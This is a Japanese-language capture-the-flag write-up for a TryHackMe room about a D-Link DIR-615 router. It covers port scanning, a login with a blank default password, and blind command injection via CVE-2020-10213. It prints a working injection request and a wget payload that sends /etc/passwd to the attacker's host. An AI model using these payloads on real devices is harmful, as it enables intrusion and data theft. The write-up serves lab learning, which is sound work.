# Royal Router CTF

https://tryhackme.com/room/hfb1royalrouter

## Enumeration

```shell
TARGET=10.49.185.86
sudo bash -c "echo $TARGET   rr.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
23/tcp    open  telnet  syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
9999/tcp  open  abyss   syn-ack ttl 63
20443/tcp open  unknown syn-ack ttl 63
24433/tcp open  unknown syn-ack ttl 63
28080/tcp open  unknown syn-ack ttl 63
50628/tcp open  unknown syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,23,80,9999,20443,24433,28080,50628 $TARGET

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
23/tcp    open  telnet?
80/tcp    open  http    DD-WRT milli_httpd
9999/tcp  open  abyss?
20443/tcp open  unknown
24433/tcp open  unknown
28080/tcp open  unknown
50628/tcp open  unknown
```

明確なのはSSHとHTTPのみ。

## HTTP

```
Product Page: DIR-615	Hardware Version: C2  	Firmware Version: 3.03WW

Copyright © 2004-2008 D-Link Corporation, Inc.
```

脆弱性検索

```sh
$ searchsploit D-Link DIR-615
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
D-Link DIR-615 - Cross-Site Request Forgery                                      | hardware/webapps/41821.txt
D-Link DIR-615 - Denial of Service (PoC)                                         | hardware/dos/45317.txt
D-Link DIR-615 - Multiple Buffer Overflow Vulnerabilities                        | hardware/remote/38723.txt
D-Link DIR-615 - Multiple Vulnerabilities                                        | hardware/webapps/41033.txt
D-Link DIR-615 - Privilege Escalation                                            | hardware/webapps/47778.txt
D-Link DIR-615 Rev D3 / DIR-300 Rev A - Multiple Vulnerabilities                 | hardware/webapps/24975.txt
D-Link DIR-615 Rev H - Multiple Vulnerabilities                                  | hardware/webapps/24477.txt
D-Link DIR-615 T1 20.10 - CAPTCHA Bypass                                         | hardware/webapps/48551.txt
D-Link DIR-615 vE4 Firmware 5.10 - Cross-Site Request Forgery                    | hardware/webapps/31764.txt
D-Link DIR-615 Wireless Router - Persistent Cross Site Scripting                 | hardware/remote/44473.txt
D-Link DIR-615 Wireless Router  -  Persistent Cross-Site Scripting           | hardware/webapps/47776.txt
D-Link DIR-615H - OS Command Injection (Metasploit)                              | hardware/remote/25609.rb
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

バージョン的には、https://www.cvedetails.com/cve/CVE-2021-37388/ が完全一致している。

```
D-Link DIR-615 C2 ping_response.cgi ping_ipaddr Buffer Overflow Allows Webserver Crash and Possible Remote Code Execution
```

が、具体的なエクスプロイトは見つからなかった。  
searchsploit で出てきた脆弱性は全て2020年以前なので、バージョンが異なる？

D-Link のデフォルトパスワードを調べた。https://cirt.net/passwords/?vendor=D-Link

HTTPのデフォルトパスワードがブランクだったので、ブランクにしてログインボタンを押すとログインできた。

## Adminパネル

```
192.168.100.2
255.255.255.0
dlinkrouter
```

ポートフォワーディングを利用して内部ネットワークのホストにアクセスするのかと思ったが、ステータスタブからLANコンピュータを見ても空になっているので、このルータ以外のホストは存在しないと思われる。（DHCPが無効になっており静的IPを設定しているという可能性はある）

ping画面で、192.168.100.1 から応答があることを確認。(1-12の範囲を確認した)

下記でポートフォワーディングを設定したが、nampの結果が最初と全く変わらない。

```
1-79,81-65535
192.168.100.1
```

```sh
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
23/tcp    open  telnet  syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
9999/tcp  open  abyss   syn-ack ttl 63
20443/tcp open  unknown syn-ack ttl 63
24433/tcp open  unknown syn-ack ttl 63
28080/tcp open  unknown syn-ack ttl 63
50628/tcp open  unknown syn-ack ttl 63
```

仮想サーバーの設定を使っても同様で、機能している感触が無い。

## RCE

ウォークスルーを見た。

脆弱性によるRCEを狙うのが正解。

当たりを付けていた CVE-2021-37388 ではなく、CVE-2020-10213 が正解。

https://nvd.nist.gov/vuln/detail/CVE-2020-10213

do_wps.asp をリクエストしてPINを入力する。00000000 とか、12345670 とか。そのとき送信されるリクエストをインターセプト。

sleepを入れると時間がかかるので、コマンドインジェクションが成功していることが分かる。

```http
POST /set_sta_enrollee_pin.cgi HTTP/1.1
Host: rr.thm
Content-Length: 135
Cache-Control: max-age=0
Origin: http://rr.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT; WindowsPowerShell/5.1.19041.1)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://rr.thm/do_wps.asp
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Connection: keep-alive

html_response_page=do_wps_save.asp&html_response_return_page=do_wps.asp&reboot_type=none&wps_pin_radio=0&wps_sta_enrollee_pin=`sleep 5`
```

リバースシェルを取ろうと頑張ったが、断念した。

wget が有効なので、下記の形でコマンドを実行できる。

```
wps_sta_enrollee_pin=`wget+http://192.168.129.39:8000/$(cat+/etc/passwd)`
```

```
10.49.185.86 - - [03/Mar/2026 15:56:52] "GET /root:x:0:0:root:/root:/bin/sh HTTP/1.1" 404 -
```

あとは基本的なコマンドを使ってフラグファイルを見つけて表示するだけ。

## 振り返り

- CVE-2020-10213 とそのエクスプロイトの発見が至難。CVE-2020-10213 から逆引きしても難しく、自力では無理だったと思う。
- ポートフォワーディングを設定しても効果が見られなかったが、背後でどうなっていたのかは謎のまま。
- ブラインドコマンドインジェクションの今回の形は初めて見る形だったが、良い学びになった。

## Tags

#tags:D-Link #tags:ルーター
